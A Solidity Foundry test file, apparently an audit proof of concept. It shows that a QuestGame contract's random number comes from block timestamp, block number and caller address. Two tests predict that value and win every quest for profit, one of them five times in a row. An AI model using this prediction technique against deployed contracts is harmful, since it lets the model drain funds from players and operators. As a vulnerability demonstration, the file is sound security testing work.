
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {

    QuestGame public questGame;
    address public attacker;

    function setUp() public {
        questGame = new QuestGame{value: 10 ether}();
        attacker = address(this);
        vm.deal(attacker, 10 ether);
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        
        // --- 1. Constraints ---
        vm.assume(blockTimestamp > 1 hours);
        vm.assume(blockTimestamp < type(uint128).max);
        vm.assume(blockNumber > 0);
        vm.assume(blockNumber < type(uint128).max);

        // --- 2. State Configuration ---
        
        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        // --- 3. Replication & Assertion ---
        
        // Replicate the vulnerable random number generation logic
        uint256 predictedSeed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.number,
                    attacker
                )
            )
        );
        uint256 predictedNumber = predictedSeed % 100;

        // Record initial state
        (uint256 expBefore, uint256 winsBefore) = questGame.getPlayerStats(attacker);
        uint256 balanceBefore = address(attacker).balance;

        // Execute the quest with our predicted number
        questGame.attemptQuest{value: 0.1 ether}(predictedNumber);

        // Verify the attack succeeded
        (uint256 expAfter, uint256 winsAfter) = questGame.getPlayerStats(attacker);
        uint256 balanceAfter = address(attacker).balance;

        // Assert that we won (experience increased by 100, wins increased by 1)
        assertEq(expAfter, expBefore + 100, "Experience should increase by 100");
        assertEq(winsAfter, winsBefore + 1, "Wins should increase by 1");
        
        // Assert that we received the reward (0.2 ether reward - 0.1 ether entry fee = 0.1 ether profit)
        assertEq(balanceAfter, balanceBefore - 0.1 ether + 0.2 ether, "Should receive reward");
    }

    function test_exploitMultipleWins() public {
        // Demonstrate that an attacker can consistently win by predicting the random number
        
        uint256 initialBalance = address(this).balance;
        uint256 winsCount = 0;
        
        for (uint256 i = 0; i < 5; i++) {
            // Advance time to bypass cooldown
            vm.warp(block.timestamp + 1 hours + 1);
            vm.roll(block.number + 1);
            
            // Predict the random number using the same logic as the contract
            uint256 predictedSeed = uint256(
                keccak256(
                    abi.encodePacked(
                        block.timestamp,
                        block.number,
                        address(this)
                    )
                )
            );
            uint256 predictedNumber = predictedSeed % 100;
            
            // Attempt quest with predicted number
            questGame.attemptQuest{value: 0.1 ether}(predictedNumber);
            winsCount++;
        }
        
        // Verify all attempts were successful
        (, uint256 wins) = questGame.getPlayerStats(address(this));
        assertEq(wins, winsCount, "All quest attempts should be wins");
        
        // Verify profit (5 wins * 0.1 ether profit per win = 0.5 ether profit)
        assertEq(address(this).balance, initialBalance + (winsCount * 0.1 ether), "Should have profited from all wins");
    }

    receive() external payable {}
}
